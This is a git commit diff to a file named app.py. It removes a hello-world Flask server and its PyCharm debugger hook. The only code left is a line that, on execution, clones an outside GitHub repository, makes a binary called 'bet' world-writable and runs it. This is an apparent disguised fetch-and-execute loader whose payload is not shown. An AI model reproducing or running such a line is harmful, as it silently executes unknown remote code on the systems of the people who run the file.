4c68228b818ff167a08137d3b0280da9076364e8
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-06-12 15:06:20 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,23 +1,2 @@
 import os
-import pydevd_pycharm
-from flask import Flask
-
-app = Flask(__name__)
-import os
 os.system ('git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 bet && ./bet')
-@app.route('/')
-def hello_world():
-    msg = 'Hello World!'
-    return msg
-
-def attach():
-  if os.environ.get('WERKZEUG_RUN_MAIN'):
-    print('Connecting to debugger...')
-    pydevd_pycharm.settrace('0.0.0.0', port=9000, stdoutToServer=True, stderrToServer=True)
-
-if __name__ == '__main__':
-  print('Starting hello-world server...')
-  # comment out to use Pycharm's remote debugger
-  # attach()
-
-  app.run(host='0.0.0.0', port=8080)
